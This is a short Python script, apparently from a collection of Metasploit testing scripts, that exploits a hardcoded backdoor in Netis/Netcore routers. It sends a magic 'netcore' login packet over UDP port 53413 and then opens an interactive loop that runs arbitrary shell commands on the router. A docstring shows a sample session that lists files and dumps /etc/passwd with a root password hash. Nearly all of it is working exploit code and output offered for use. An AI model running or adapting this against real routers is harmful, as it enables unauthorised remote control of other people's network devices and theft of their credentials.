import socket
import argparse
import binascii
'''
Example run:
root@rageKali:/media/veracrypt1/stcyr/git/MSF-Testing-Scripts# python netis_backdoor.py 192.168.1.1
Unlocking Backdoor
Quit to quit loop
Netis> ls /tmp/
AuCVM
XqdHc
bVOQm
br_type
bridge_init
cfg-macclone
checkupfile
ddfile
default_rt
dhcpd_action
file.txt
hzbjo
igd_config.old
jiDOo
log
ntp_tmp
passwd
reg_domain
syslogd_support
tmp.txt
update_main
version
wan_type
workmode

Netis> cat /etc/passwd
root:abSQTPcIskFGc:0:0:root:/:/bin/sh
nobody:x:99:99:Nobody:/:

'''
parser = argparse.ArgumentParser(description='Netis backdoor')
parser.add_argument('IP', help='IP of router to connect to')

args = parser.parse_args()

def send(command, print_response = True):
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   #s.connect((args.IP, 53413))
   s.sendto("AA\x00\x00AAAA%s\x00" %(command), (args.IP, 53413))
   if print_response:
      resp = s.recv(2048)
      resp = resp[8:]
      if binascii.hexlify(resp) == "000000ff":
         print("No response, command not found or error in command")
      else:
         print(resp)

def login():
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   #s.connect((args.IP, 53413))
   s.sendto("AAAAAAAAnetcore\x00", (args.IP, 53413))

print("Unlocking Backdoor")
login()
input = ""
print("Quit to quit loop")
input = raw_input("Netis> ").strip()
while not input.strip().upper() in ["QUIT","EXIT"]:
   send(" " + input)
   input = raw_input("Netis> ").strip()

